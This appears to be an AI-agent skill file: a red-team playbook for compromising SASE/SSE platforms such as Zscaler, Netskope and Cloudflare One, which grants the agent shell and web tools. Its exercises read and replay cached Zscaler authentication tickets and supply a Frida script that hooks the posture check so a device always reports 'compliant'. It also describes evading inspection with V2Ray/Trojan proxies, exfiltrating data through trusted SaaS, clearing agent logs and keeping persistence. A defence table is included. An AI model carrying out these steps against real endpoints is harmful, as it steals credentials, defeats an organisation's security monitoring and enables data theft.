---
name: sase-sse-attack
description: "Secure Access Service Edge (SASE) and Security Service Edge (SSE) platform compromise covering Zscaler (ZIA/ZPA/ZDX/Client Connector), Netskope (Security Cloud, SWG, CASB, Private Access), Palo Alto Prisma Access, Cisco Umbrella, CATO Networks SASE, Cloudflare One (WARP, Gateway, Access), and Microsoft Entra Global Secure Access — including client connector reverse engineering, TLS inspection bypass via certificate pinning and ESNI/ECH, split-tunnel race conditions, BYOD vs managed device bypass, stolen SSO token replay through SSE proxy, anonymizer proxy evasion (Shadowsocks/V2Ray/Obfs4/Trojan), and detection avoidance using Wireshark, Frida, mitmproxy, JA3/JA4 fingerprint spoofing."
origin: github-trending-2026
version: 0.1.31
compatibility: ">=0.1.31"
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - Glob
  - Grep
  - WebFetch
metadata:
  domain: network-security
  category: sase-sse
  tool_count: 11
  guide_count: 1
  mitre: "T1557-Adversary-in-the-Middle, T1027-Obfuscated Files or Information, T1078-Valid Accounts, T1550-Use Alternate Authentication Material, T1572-Protocol Tunneling, T1573-Encrypted Channel"
  keywords:
    - sase
    - sse
    - zscaler
    - zia
    - zpa
    - netskope
    - prisma-access
    - cisco-umbrella
    - cato-networks
    - cloudflare-one
    - cloudflare-warp
    - entra-global-secure-access
    - swg
    - casb
    - ztna
    - fwaas
    - tls-inspection
    - ssl-bypass
    - client-connector
    - ja3
    - ja4
    - doh
    - dot
    - esni
    - ech
    - split-tunnel
    - byod
    - shadowsocks
    - v2ray
    - obfs4
    - trojan-proxy
---



# Skill: SASE / SSE Platform Attack

> **Supplementary Files**:
> - `payloads.md` — Command catalogue organized by vendor (Zscaler, Netskope, Palo Alto Prisma Access, Cisco Umbrella, CATO Networks, Cloudflare One, Microsoft Entra Global Secure Access) and by cross-cutting technique (client connector reverse engineering, TLS inspection bypass, split-tunnel abuse, anonymizer proxy evasion, identity-based bypass). 14 sections with real commands, Frida scripts, mitmproxy addons, JA3/JA4 spoofing configs, and detection-evasion patterns for authorized red team operations.
> - `test-cases.md` — Structured test cases (TC-SS-001..012): SSE vendor fingerprinting, Zscaler Client Connector reverse engineering, ZPA App Connector takeover, Zscaler OAuth token replay, Netskope client bypass via app-specific routing, MACE evasion, TLS fingerprint (JA3/JA4) spoofing, Palo Alto Prisma Access agent auth bypass, Cisco Umbrella roaming client bypass, Cloudflare WARP/Gateway bypass, anonymizer proxy (Shadowsocks/V2Ray/Obfs4/Trojan) evasion, split-tunnel race condition exploitation.
> - `guides/sase-sse-attack-playbook.md` — End-to-end red team playbook: identify SSE vendor → enumerate client connector → reverse engineer bypass → exfiltrate through SSE → evade SSL inspection → detection guidance. Includes lab setup (simulated Zscaler/Netskope tenant, BYOD device with Frida), MITRE ATT&CK mapping, vendor decision tree, and report template.

## Summary

SASE/SSE attack skill domain covering modern converged cloud security platforms — the SWG (Secure Web Gateway) + CASB (Cloud Access Security Broker) + ZTNA (Zero Trust Network Access) + FWaaS (Firewall-as-a-Service) stack sold by Zscaler, Netskope, Palo Alto, Cisco, CATO, Cloudflare, and Microsoft. The corporate network edge is no longer a VPN concentrator or a perimeter firewall; it is a HTTPS interception proxy in the cloud, a posture-checking agent on every endpoint, and an SSO-bound identity layer that decides which user on which device gets to talk to which app. This skill is the SSE-era counterpart to `vpn-attack`: where that skill covers traditional IPsec/SSL VPN tunnels, this skill covers the agent-based, identity-aware, TLS-intercepting converged platforms that have largely replaced VPN for branch, remote, and BYOD access.

**Tools**: Wireshark, mitmproxy + mitmweb, Frida (macOS, Windows, Linux agents), Burp Suite, JA3/JA4 tooling (ja3-python, ja4), Python cryptography / cryptography.io, OpenSSL, CFSSL, Charles Proxy, Proxyman, HTTP Toolkit, Shadowsocks / V2Ray / Obfs4 / Trojan (for evasion lab), Terraform (for tenant lab provisioning), Microsoft Graph + Entra ID tooling (cross-references `cloud-identity-attack`).

**Domain**: network-security

**MITRE ATT&CK**: T1557-Adversary-in-the-Middle (TLS interception, SSL pinning bypass), T1027-Obfuscated Files or Information (TLS fingerprint spoofing, anonymizer proxies), T1078-Valid Accounts (stolen SSO token replay through SSE), T1550-Use Alternate Authentication Material (OAuth token, session cookie, mTLS cert reuse), T1572-Protocol Tunneling (Shadowsocks/V2Ray over SSE), T1573-Encrypted Channel (DoT/DoH/ECH).

## Description

The enterprise edge converged. In 2015, a remote user opened an AnyConnect or Pulse Secure tunnel, hit a perimeter firewall, and exited through a forward proxy; each function was a separate appliance with separate logs. In 2026, the same user runs a single agent — Zscaler Client Connector, Netskope Client, GlobalProtect, Cisco Secure Client (Umbrella Roaming), CATO Socket, Cloudflare WARP, or Microsoft Global Secure Access Client — that performs identity-aware posture checking, establishes a tunnel to a vendor cloud, decrypts and inspects every HTTPS flow against SWG/CASB policies, and re-encrypts to the destination. Every domain you resolve, every TLS handshake you start, every SSO cookie you send passes through that one agent and that one vendor cloud. The SSE cloud is a globally distributed adversary-in-the-middle — deployed by the defender.

This skill covers the eight things that distinguish SASE/SSE attacks from traditional VPN attacks:

1. **The agent is the new perimeter — and it lives on the endpoint** — Traditional VPN concentrators were network devices; the agent is a userland process with kernel extensions (NetworkExtension on macOS, WFP/NDIS on Windows, eBPF on Linux) and a TLS inspection root cert in the system trust store. The agent's attack surface includes its IPC interfaces (Zscaler's `ztwsrvd`, Netskope's `stAgentUI`, GlobalProtect's `PanGPA`), its local config files, its authentication state (OAuth tokens, mTLS certs, posture cookies), and its trust anchor (the root cert that lets it impersonate every HTTPS site). Compromise the agent or its trust anchor → decrypt every flow. Mandiant's 2023 research on BYOD-targeting malware (e.g., the OSX/Shlayer variant that specifically tries to disable Zscaler Client Connector on macOS) shows this is no longer theoretical.

2. **TLS inspection is mandatory and unilateral — and bypassable at the protocol layer** — The SSE cloud decrypts every flow by presenting its own leaf cert signed by its own root, which is installed in the system trust store by the agent. This works against every browser, every language's default HTTP client, and most SDKs. It fails against (a) certificate-pinning apps that refuse the SSE root, (b) ECH/ESNI-aware clients that encrypt the inner SNI, (c) DoH/DoT resolvers that bypass the corporate DNS the SSE uses for policy, (d) protocols layered on TLS that re-encrypt (Shadowsocks, V2Ray vmess+vless+tls, Trojan, Obfs4) and present a fingerprint the SWG does not recognize as proxy egress.

3. **Identity is the new ACL — and tokens are the credential** — Zscaler ZIA authenticates via SAML SSO or an OAuth-ish "Zscaler Ticket" issued by the Zscaler Issuing Server after a successful SSO redirect. ZPA App Connectors authenticate to the Zscaler cloud via a provisioning key + mTLS cert. Netskope authenticates the client via the user's IdP session + a per-tenant token. If an attacker steals the user's SSO cookie (via Phar-style cookie theft on macOS, LSASS reading on Windows, or SSE cloud token replay), the SSE cloud accepts the replayed token because the session is the identity — there is no second factor for "decrypt this flow" beyond the device posture the agent reports, and the agent's posture state is local to the endpoint.

4. **App Connectors and Service Nodes are lateral movement** — ZPA's architecture is "App Connectors" inside the corporate network, "Zscaler Cloud" in the middle, and "Zscaler Client Connector" on the endpoint. The App Connector holds a long-lived provisioning key and a mTLS cert; compromise one App Connector → reach every internal app the connector publishes. Mandiant documented (2024) a Chinese APT campaign that targeted Zscaler App Connectors as a persistence mechanism after the initial email compromise. The same pattern applies to Netskope Private Access Publishers, Palo Alto Prisma Access Service Infrastructure, and Cloudflare Tunnel connectors.

5. **Posture is a function the agent computes — and the agent lives on the attacker's box** — The SSE cloud asks "is this device compliant?" and the agent answers. The agent's posture answer is derived from local state — domain join check, EDR running check, disk encryption check, OS version, installed certificates. On BYOD the agent is unmanaged; on a managed device the agent reads MDM-enforced state. An attacker on a compromised managed device can patch the agent's posture reporter (Frida hook on `getPosture()`, modified `nspa.xml`, registry rewrite on Windows) to always return "compliant". On BYOD, the posture check is weaker by design — many ZTNA policies exclude BYOD from posture, treating "agent is running" as sufficient.

6. **Split-tunneling is a race condition** — Zscaler, Netskope, and Cisco Umbrella all support "internet-bound traffic via SSE, internal traffic direct" or the inverse. The decision is made per-flow by the agent based on a routing/PAC config. A process that binds a socket, sends the first SYN before the agent installs its WFP/NetworkExtension filter, or routes through a TUN interface the agent does not manage, can win the race and bypass the SSE entirely. Browser-based "app-specific routing" (Zscaler's "ZIA Forwarding for ZPA Apps", Netskope's "Steerable VPN") introduces a similar race at the app layer: a process that the agent classifies as "not subject to policy" goes direct.

7. **Anonymizers defeat SWG policy — and SWGs know it** — Shadowsocks (socks5 over TLS-ish), V2Ray (vmess/vless/trojan over WS/gRPC/TLS), Obfs4 (TOR with obfuscation), and Trojan (https-look proxy that serves a real website on probe) present a TLS handshake that the SWG cannot classify as proxy-evasion. SASE vendors maintain lists of known anonymizer infrastructure (datacenter IP ranges, known V2Ray nodes) and block them at the SWG — but the underlying TLS flow is indistinguishable from legitimate HTTPS, so blocking is IP/reputation-based. A V2Ray node on residential IP, or a Shadowsocks server on a cloud provider not yet classified as VPN, evades the SWG entirely.

8. **Cross-vendor SSE detection is homogenous — defeat one, defeat all** — All major SSE agents install a root cert, hook DNS, and intercept HTTPS. The defense for one is the defense for all: pinning, DoH, ECH, anonymizing proxies, race conditions. Mandiant/CrowdStrike/CISA research on Zscaler bypass applies to Netskope with minor modifications. The 2023 Storm-0558 Microsoft Entra compromise highlighted that the same stolen IdP token that granted mail access also authenticated to Microsoft Entra Global Secure Access — the SSE trust the IdP, so the IdP compromise is the SSE compromise.

**Difference from `vpn-attack`**: vpn-attack covers IPsec/IKE, SSL VPN (Pulse, Fortinet, Cisco AnyConnect Secure Mobility), OpenVPN, WireGuard — network-layer tunnels with a concentrator. This skill covers agent-based, identity-aware, TLS-intercepting SASE/SSE platforms (Zscaler, Netskope, Palo Alto Prisma Access, Cisco Umbrella, CATO, Cloudflare One, Microsoft Entra GSA). The overlap is "tunnel" — but VPN tunnels carry L3 packets while SSE tunnels carry HTTPS flows with mandatory TLS decryption. Where vpn-attack enumerates IKE transforms and PSKs, this skill enumerates client connector IPC and TLS root certs.

**Difference from `cloud-identity-attack`**: cloud-identity-attack covers the IdP layer (Entra ID, Okta, Auth0, Ping) and the OAuth/OIDC/SAML tokens issued there. This skill covers what happens to those tokens after they are issued — the SSE cloud trusts them, the agent enforces posture, and the SWG decrypts traffic based on the policy they unlock. Storm-0558 is the bridge: the IdP compromise → SSE bypass.

**Difference from `network-tunneling-proxy`**: network-tunneling-proxy covers generic tunneling (SSH, Chisel, Ngrok, DNS tunneling, ICMP tunneling). This skill uses those techniques specifically to evade the SWG — Shadowsocks/V2Ray/Trojan are network-tunneling-proxy tools deployed against the SSE inspection plane.

**Difference from `api-security`**: api-security covers REST/GraphQL/gRPC API testing generically. This skill covers the vendor-specific APIs of SASE platforms: Zscaler Login API (`/login/v1/auth`), Zscaler ZIA admin API (`/api/v1`), Netskope REST API v2 (`/api/v2`), Palo Alto Prisma Access API, Cisco Umbrella Management API, Cloudflare Access API. The SASE admin API is the lateral movement target once an admin token is obtained.

## Use Cases

- **SSE red team / authorized bypass assessment**: Starting from a BYOD or compromised managed device, demonstrate exfiltration through the SSE cloud without detection — covering agent bypass, TLS inspection defeat, anonymizer evasion, and split-tunnel race conditions.
- **Zscaler ZIA + ZPA assessment**: Identify the ZIA tenant, enumerate forward proxy policies, test the Client Connector for IPC vulnerabilities, evaluate ZPA App Connector exposure, validate OAuth/Zscaler Ticket replay, and document every bypass class.
- **Netskope Security Cloud assessment**: Test the Netskope Client for app-specific routing bypass, MACE (Mirror Access Control Engine) evasion, JA3/JA4 fingerprint spoofing against Netskope's TLS classification, and Netskope TLS root cert theft.
- **Palo Alto Prisma Access assessment**: Evaluate the GlobalProtect agent's auth bypass surface, the Prisma Access Service Infrastructure exposure, and the Cloud Service Plugin admin API.
- **Cisco Umbrella assessment**: Test the roaming client bypass via DoH/DoT, the SmartProxy block-page bypass, and the Management API surface.
- **CATO Networks SASE assessment**: Test the SASE Socket (hardware/virtual) takeover surface, the isolated-traffic tunneling abuse patterns, and the management socket IPC.
- **Cloudflare One / Zero Trust assessment**: Test WARP client bypass, Cloudflare Gateway bypass via DoH, Access SSO bypass via stolen service token, and tunnel manipulation.
- **Microsoft Entra Global Secure Access assessment**: Test the Windows GSA client for traffic forwarding bypass, Private Access & Internet Access profile abuse, and the SSE implications of Entra ID compromise (Storm-0558 pattern).
- **Anonymizer proxy evasion lab**: In an authorized lab, deploy Shadowsocks / V2Ray (vmess/vless + WS + TLS) / Obfs4 / Trojan behind a residential IP, and demonstrate that the SWG cannot classify or block the resulting flows.
- **SSE incident response support (defender side)**: Given Indicators of Compromise (unexpected root cert, agent service stopped, anomalous DNS to a DoH resolver, unknown TUN interface), trace the bypass technique, identify the bypass class, and document for forensics.
- **Posture-check bypass audit**: For each SSE vendor, audit the agent's posture reporter logic and identify which signals (domain join, EDR running, disk encryption) are spoofable via Frida hooks, file edits, or registry tampering.

## Core Tools

### Reconnaissance and Fingerprinting

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Wireshark / tshark** | Capture and analyze the agent's TLS handshakes, IPC, and DNS — fingerprint the SSE vendor | `tshark -i en0 -Y 'tls.handshake.extensions_server_name contains "zscaler"' -T fields -e tls.handshake.extensions_server_name` |
| **ja3 / ja4 (Python)** | Compute TLS client fingerprints to identify and spoof the agent's handshake | `python -m ja3  --host gateway.zscaler.net --port 443` |
| **curl + OpenSSL** | Inspect the SSE root cert and the interception leaf certs presented by the SWG | `openssl s_client -showcerts -connect gateway.zscaler.net:443 \| openssl x509 -noout -issuer -subject` |

### Client Connector Reverse Engineering

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Frida** (macOS, Windows, Linux) | Hook the agent's posture, auth, and routing logic in real time | `frida -n "ZscalerClientConnector" -l bypass-posture.js` |
| **mitmproxy / mitmweb** | Intercept the agent's HTTPS control plane (with the agent's own root) and replay | `mitmweb --mode upstream:https://gateway.zscaler.net -s modify-headers.py` |
| **Hopper / Ghidra / IDA Free** | Disassemble the agent binary to locate posture, auth, and routing routines | `hopper -- disassemble /Applications/Zscaler/ZscalerClientConnector.app/Contents/MacOS/ZscalerClientConnector` |
| **Charles Proxy / Proxyman** | macOS-friendly HTTPS interception with the SSE root installed in their CA bundle | set up "SSL Proxying for *" |

### TLS Inspection Bypass and Anonymizer Tooling

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **shadowsocks-rust / outline-server** | Deploy a Shadowsocks server behind a residential IP and a local client that bypasses the SWG | `sslocal -c config.json` |
| **V2Ray (Xray) / v2ray-core** | Deploy vmess/vless + WebSocket + TLS to look like legitimate HTTPS to the SWG | `v2ray run -c config.json` |
| **obfs4proxy** | TOR bridge with traffic obfuscation; the SWG cannot recognize it as TOR | `obfs4proxy -loglevel=ERROR` |
| **trojan-go / trojan** | HTTPS-look proxy that serves a real website on probe; identical TLS profile to a CDN frontend | `trojan -config config.json` |
| **dnscrypt-proxy / stubby** | DoH/DoT resolvers that bypass the SSE-enforced corporate DNS resolver | `dnscrypt-proxy -config dnscrypt-proxy.toml` |

### Vendor Admin API Tooling (cross-references `cloud-identity-attack`)

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Zscaler API Python SDK** | Manage ZIA / ZPA / ZDX via the admin API | `zscaler-sdk-python` (community) |
| **Netskope REST API v2 (curl)** | Manage Security Cloud via `v2` endpoints with an OAuth token | `curl -H "Authorization: Bearer $NS_TOKEN" https://<tenant>.goskope.com/api/v2/clients` |
| **Cloudflare Access API (cf-api)** | Manage Access service tokens, tunnel configs | `curl -H "Authorization: Bearer $CF_TOKEN" https://api.cloudflare.com/client/v4/accounts/<aid>/access/apps` |
| **Microsoft Graph + Entra GSA Graph endpoints** | Manage the GSA traffic forwarding profiles | `az rest --method get --url "https://graph.microsoft.com/beta/networkAccess/forwardingProfiles"` |

## Methodology

### SSE Attack Six-Phase Workflow

```
Phase 1            Phase 2            Phase 3            Phase 4            Phase 5            Phase 6
Vendor Recon   →   Client Connector   →   TLS Inspection →   Policy Bypass  →   Data            →   Detection
& Fingerprint      Reverse Eng.       Bypass              (App-Specific       Exfiltration        Avoidance &
                   (Frida/Hopper)     (Pinning/DoH/ECH)   Routing/Split)      via SSE/Anonymizer Persistence
   │                 │                 │                   │                  │                  │
   ▼                 ▼                 ▼                   ▼                  ▼                  ▼
 TLS cert issuer,   IPC, posture      Cert pinning,      ZIA-FWD-ZPA race,  Covert C2 over     Signatures,
 agent binary,      logic, auth       ECH/ESNI,          MACE evasion,      V2Ray/Trojan,      log hygiene,
 config files,      token cache,      DoH/DoT to          JA3/JA4 spoof,     data over SWG-     cert rotation,
 admin tenant       mTLS cert          outside resolver,   token replay       trusted egress     post-engagement
 enumeration        extraction         TLS fingerprint     through SSE                          cleanup
                    Frida hooks        spoofing                                                 ⚠ Authorized lab
```

**Phase 1: Vendor Recon & Fingerprint** — Identify the SSE vendor from the endpoint side. Look at the system trust store (who installed a root cert?), running processes (which agent is alive?), routing table (which TUN/utun is the agent's?), DNS resolver (which upstream does the agent enforce?), and HTTPS interception leaf (which issuer does the cert chain end with?). On the network side, identify the egress IPs the agent talks to (`gateway.zscaler.net`, `<tenant>.goskope.com`, `prismaaccess.com`, `edge.cloudfront.net` for Cloudflare). Enumerate the admin tenant via the vendor's public-facing portal (`https://admin.<vendor>.com`) when scoped.

**Phase 2: Client Connector Reverse Engineering** — Disassemble and instrument the agent. Locate the posture reporter (e.g., `getPosture()` in Zscaler's `ZscalerClientConnector`, the `nspa.xml` file consumed by Netskope, the `PanGPA.heavy.lite` files in GlobalProtect). Hook the posture function with Frida to always return "compliant". Locate the auth token cache (Zscaler's `~/Library/Application Support/Zscaler/`, Netskope's `~/Library/Application Support/Netskope/`, GlobalProtect's `~/Library/Preferences/com.paloaltonetworks.GlobalProtect.settings.plist`); extract the OAuth / Zscaler Ticket / mTLS cert. Locate the IPC surface (Unix domain socket, named pipe, localhost TCP); enumerate commands accepted without authentication.

**Phase 3: TLS Inspection Bypass** — Defeat the agent's mandatory HTTPS interception. Three layers: (a) **Application pinning** — apps that pin to the real leaf cert reject the SSE's interception cert; the SSE either allows the flow direct (bypass) or fails it. Identify pinned apps and route traffic through them. (b) **Encrypted Client Hello (ECH) / ESNI** — clients that support ECH encrypt the inner SNI; the SWG cannot classify by destination domain. Configure Firefox/Chromium to enforce ECH. (c) **DNS bypass via DoH/DoT** — clients that resolve via DoH (`https://cloudflare-dns.com/dns-query`, `https://dns.google/dns-query`) bypass the corporate DNS the SSE uses for categorization; the SWG sees the destination IP but not the domain-based policy.

**Phase 4: Policy Bypass (App-Specific Routing, Split-Tunnel, Token Replay)** — Defeat the SSE's traffic steering. Techniques: (a) **App-specific routing race** — Zscaler's ZIA-FWD-ZPA, Netskope's Steerable VPN: a process classified as "not subject to policy" goes direct; identify the classification (by binary hash, by user, by destination) and inject a process that matches the bypass. (b) **Split-tunnel race condition** — bind the socket, send the first SYN before the agent's WFP/NetworkExtension filter is installed. (c) **MACE (Netskope Mirror Access Control Engine) evasion** — modify the headers / TLS fingerprint that MACE classifies on; spoof JA3/JA4 to match a "trusted" client. (d) **Stolen token replay through SSE** — the SSO cookie / OAuth token / Zscaler Ticket that authenticates the user to the SSE cloud can be replayed from another device; the SSE cloud trusts the token, not the device posture (in many configurations).

**Phase 5: Data Exfiltration** — Once policy is bypassed, exfiltrate data through or around the SSE. Through the SSE: data packaged inside a "trusted" HTTPS flow (e.g., to a corporate-trusted SaaS like OneDrive or Google Drive that the SWG does not inspect deeply). Around the SSE: data over V2Ray/Shadowsocks/Trojan to a residential IP the SWG does not classify as anonymizer. Hybrid: data over DoH to a malicious domain the SWG has not yet categorized.

**Phase 6: Detection Avoidance & Persistence** — Maintain access. Techniques: (a) **Log hygiene** — clear agent logs (where the agent logs locally), avoid triggering the agent's DLP/SSL-logging signature, time bypass activity to overlap with legitimate user activity. (b) **Persistence via the agent itself** — install a second agent profile, modify the PAC config to prefer attacker-controlled upstream, persist the stolen token across reboots. (c) **Cert rotation** — the SSE root cert is the trust anchor; if it rotates (annual cadence typically), re-extract.

### Quick Selection Guide

| Scenario | Primary Approach | Alternative |
|----------|------------------|-------------|
| Identify the SSE vendor on a BYOD device | Check macOS Keychain / Windows certmgr for a root cert with CN matching Zscaler/Netskope/Palo/Cisco/CATO/Cloudflare/Microsoft | `ps -ef \| grep -iE 'zsagent\|nspa\|pangpa\|umbrella\|cato\|warp\|gsa'` |
| Bypass Zscaler ZIA inspection on the endpoint | ECH-enabled Firefox + DoH to a non-Zscaler resolver; or V2Ray with TLS over a residential IP | Frida-hook the ZscalerClientConnector to skip policy enforcement |
| Steal the Zscaler Client Connector auth token | Read `~/Library/Application Support/Zscaler/` (macOS) or `%APPDATA%\Zscaler` (Windows); extract the `zsatoken`/`obkey` | Frida-hook the agent at the moment it acquires the token from the IdP |
| Compromise a ZPA App Connector | Reach the App Connector's mTLS cert + provisioning key on a compromised internal host; replay to the Zscaler cloud | Phish a Zscaler App Connector admin → use the admin API to deploy a rogue connector |
| Bypass Netskope MACE / TLS fingerprint | Spoof JA3/JA4 to match a known-trusted client (Chrome on Windows); use BoringSSL fingerprints from `boringssl.go` source | Route via a TLS-terminating proxy that re-emits with the spoofed fingerprint |
| Bypass Cisco Umbrella roaming client | DoH/DoT to `https://doh.opendns.com` or `https://dns.google/dns-query`; or SmartProxy block-page bypass | Block the roaming client process at the host firewall; use direct DNS over `tcp/53` |
| Bypass Cloudflare WARP | WARP uninstall on BYOD; or route via a local TUN that wraps traffic in V2Ray TLS to a non-WARP egress | Spoof the WARP device registration token; register a rogue device |
| Bypass Microsoft Entra GSA | Steal the Entra ID PRT (cross-ref `cloud-identity-attack`); replay through the GSA traffic forwarding profile | Disable the GSA client's traffic filter via registry |
| Evade the SWG with an anonymizer | V2Ray vmess+WS+TLS behind a residential IP; SWG cannot classify | Trojan behind a CDN-fronted TLS endpoint; identical to legit HTTPS |
| Exploit a split-tunnel race condition | Open the socket during agent startup window; agent's WFP filter not yet installed | Use `LD_PRELOAD` / `DYLD_INSERT_LIBRARIES` to hook `connect()` and bind before classification |
| Posture-check spoof | Frida-hook `getPosture()` on the agent; or rewrite `nspa.xml` (Netskope), registry (Windows), `~/Library/Preferences` (macOS) | Patch the agent binary; persist via mTLS cert replay (posture is often cached on cert validity) |
| Defender (audit/IR) | Audit trust store for unexpected roots; review agent process logs; alert on unexpected DoH egress | CrowdStrike / Microsoft Defender for Endpoint custom detection rules for the techniques above |

### Defense Perspective

| Defense Measure | Description |
|-----------------|-------------|
| **Lock down the agent's IPC surface** | Zscaler's `ztwsrvd` Unix socket, Netskope's `stAgentUI` named pipe, GlobalProtect's `PanGPA` localhost TCP — restrict ACLs to the agent's own user. Audit the agent vendor's hardening guide quarterly. |
| **Harden the TLS root cert** | Treat the SSE root cert as the trust anchor it is: store in macOS System Keychain (not user), Windows LocalMachine Trusted Root (not CurrentUser), enforce via MDM. Audit annually; rotate every 2 years. |
| **Enforce posture on the SWG side, not the agent side** | The agent's posture answer is local state. The SWG should independently verify device compliance via a device-attestation service (Microsoft Intune's compliance attestation, Jamf + SCEP, Google BeyondCorp device cert). |
| **Block DoH/DoT to non-corporate resolvers** | Block UDP/TCP 853 to non-corporate IPs; block HTTPS to known DoH endpoints (`cloudflare-dns.com`, `dns.google`, `doh.opendns.com`). Use a corporate DoH endpoint internally. |
| **Enable ECH inspection or block ECH-capable clients** | Most SWGs cannot decrypt ECH today. Either deploy ECH-aware inspection (Zscaler/Netskope 2025 H2 roadmap) or block ECH advertisement at the network edge. |
| **MFA the SSE admin console** | The SSE admin API grants full tenant control — require phishing-resistant MFA (FIDO2) on admin login, separate from the user SSO MFA. |
| **Restrict App Connector deployment** | Zscaler ZPA / Netskope Publisher / Cloudflare Tunnel connectors hold long-lived credentials; require admin approval for new connector deployment, restrict the provisioning key scope. |
| **DLP on the SSE plane** | The SWG decrypts every flow — apply DLP (credit card, SSN, source code patterns) on the decrypted payload. Tune to your data; log every hit. |
| **TLS fingerprint allowlist** | Where the SWG supports it (Zscaler in 2025, Netskope), allowlist known-good JA3/JA4 hashes for corporate-managed apps; alert on unknown fingerprints to "trusted" destinations. |
| **Block known anonymizer infrastructure** | Subscribe to threat intel feeds of known Shadowsocks/V2Ray/Trojan infrastructure; block at the SWG. Augment with anomaly detection on TLS flows to residential IPs. |
| **Monitor agent integrity** | Defenders: hash the agent binary at boot, monitor for binary tampering, alert on agent service stop / disable. EDR rule: `process_name=ZscalerClientConnector AND action=terminate` → alert. |
| **Audit guest / BYOD posture policy** | BYOD posture is weaker by design. Ensure BYOD cannot reach privileged internal apps via ZTNA; restrict BYOD to "internet only" SSE routing. |
| **Cloud-to-cloud SSE trust review** | The SSE trusts the IdP (Entra ID, Okta). If the IdP is compromised (Storm-0558 pattern), the SSE is compromised. Audit the SSE's per-IdP-app role assignments quarterly. |

## Practical Steps

> **Detailed payloads in `payloads.md`, complete test checklist in `test-cases.md`.**

### Exercise 1: Identify the SSE Vendor on an Endpoint (macOS)

```bash
# 1. Check the system trust store for an SSE-installed root cert
security find-certificate -a -c 'Zscaler' /Library/Keychains/System.keychain 2>&1 | head -5
security find-certificate -a -c 'Netskope' /Library/Keychains/System.keychain 2>&1 | head -5
security find-certificate -a -c 'GlobalProtect' /Library/Keychains/System.keychain 2>&1 | head -5
security find-certificate -a -c 'Cisco' /Library/Keychains/System.keychain 2>&1 | head -5
security find-certificate -a -c 'CATO' /Library/Keychains/System.keychain 2>&1 | head -5
security find-certificate -a -c 'Cloudflare' /Library/Keychains/System.keychain 2>&1 | head -5
security find-certificate -a -c 'Microsoft' /Library/Keychains/System.keychain 2>&1 | head -5

# 2. List running agent processes
ps -axo pid,comm | grep -iE 'zsagent|zscaler|nspa|netskope|pangpa|globalprotect|umbrella|cato|cloudflare|warp|gsa|globalsecure'

# 3. Inspect routing table for the agent's TUN/utun interface
ifconfig | grep -E 'utun|tun|ipsec|cato|warp|tunnel'
netstat -rn | grep -E 'utun|tun'

# 4. Identify DNS resolver the agent enforces
scutil --dns | grep 'nameserver\[0\]'

# 5. Fingerprint the HTTPS interception issuer
echo Q | openssl s_client -showcerts -connect www.example.com:443 2>/dev/null \
  | openssl x509 -noout -issuer -subject
# If issuer = "Zscaler Root CA" → Zscaler ZIA
# If issuer = "Netskope Root CA" → Netskope Security Cloud
# If issuer = "Palo Alto Networks" → Prisma Access (or GlobalProtect)
# If issuer = "Cisco Umbrella" → Umbrella SWG
# If issuer = "Cloudflare" → Cloudflare Gateway
```

### Exercise 2: Zscaler Client Connector Token Cache Extraction (Authorized Lab)

```bash
# macOS: Zscaler Client Connector caches auth state
sudo find ~/Library/Application\ Support/Zscaler -type f 2>/dev/null
sudo find /Library/Application\ Support/Zscaler -type f 2>/dev/null

# The key files (paths may vary by agent version):
#   ~/Library/Application Support/Zscaler/ZscalerClientConnector/zsatoken
#   ~/Library/Application Support/Zscaler/ZscalerClientConnector/obkey
#   ~/Library/Application Support/Zscaler/ZscalerClientConnector/auditlog
#   /Library/Application Support/Zscaler/Zscaler/.zscalerinfo

# Read the obkey (Zscaler Ticket - replayable to the ZIA cloud)
sudo cat ~/Library/Application\ Support/Zscaler/ZscalerClientConnector/obkey 2>/dev/null | base64 -d 2>/dev/null | head -c 200

# Replay the Zscaler Ticket to authenticate to the ZIA cloud (authorized lab only)
ZSCALER_TICKET='REPLACE_WITH_YOUR_TICKET'
ZIA_CLOUD='REPLACE_WITH_YOUR_ZIA_CLOUD'  # e.g., gateway.zscalerbeta.net
curl -s -H "Content-Type: application/json" \
  "https://$ZIA_CLOUD/api/v1/auth?ticket=$ZSCALER_TICKET&username=REPLACE_WITH_YOUR_USERNAME" \
  | jq .
```

### Exercise 3: Frida Posture Hook (Zscaler / Generic Pattern)

```bash
# Attach Frida to the running agent (authorized lab; agent must not have anti-Frida)
# macOS pattern: hook the agent's posture reporter function

# Spawn the agent with Frida (or attach to PID)
frida -f /Applications/Zscaler/ZscalerClientConnector.app/Contents/MacOS/ZscalerClientConnector \
  -l /tmp/bypass-posture.js --no-pause

# Sample bypass-posture.js (educational; vendor/version dependent)
cat > /tmp/bypass-posture.js << 'EOF'
// Hook the posture reporter; replace with the actual function name from disassembly
// Use `frida-trace -i '*[Pp]osture*' -n ZscalerClientConnector` to discover
const postureFunc = Module.findExportByName(null, '_ZN20ZscalerClientConnector13getPostureEv')
  || Module.findExportByName(null, 'getPostureState');

if (postureFunc) {
  Interceptor.replace(postureFunc, new NativeCallback(() => {
    // Return "compliant" struct/string the agent expects
    console.log('[+] Posture hook fired — returning compliant');
    return 1;  // REPLACE: match the expected compliant return value
  }));
} else {
  console.log('[-] Posture function not found; enumerate with frida-trace');
}
EOF

# Note: Modern agents (2025+) ship with anti-Frida (PTrace checks, code signing).
# In authorized lab, disable SIP (`csrutil disable` in recovery), or use a Frida variant that evades.
```

### Exercise 4: TLS Inspection Bypass via Encrypted Client Hello (ECH)

```bash
# Firefox with ECH enforced — the SWG cannot read the inner SNI
# 1. about:config → set network.dns.echconfig.enabled=true, network.dns.use_https_rr_as_altsvc=true
# 2. Set DoH to a non-SSE resolver: about:config → network.trr.uri=https://cloudflare-dns.com/dns-query
# 3. Verify: visit https://crypto.mozilla.org/cdn-cgi/trace — verify ECH is in use

# Chromium with ECH
# 1. chrome://flags/#encrypted-client-hello → Enabled
# 2. Restart Chrome
# 3. Verify at https://tls-ech.dev/

# Demonstrate the bypass (authorized lab): visit a blocked category site
# - Without ECH: SWG reads SNI, applies policy, blocks
# - With ECH: SWG cannot read SNI; if policy is domain-based, the flow passes

# Note: Many SASE vendors added ECH-block at the network edge in 2024.
# Test whether the specific deployment blocks ECH by checking TLS handshake:
tshark -i en0 -Y 'tls.handshake.type == 1' -V 'tls.handshake.extension_info' \
  -o 'tls.keys_list:...' 2>&1 | grep -i 'ECH\|encrypted_server_name'
```

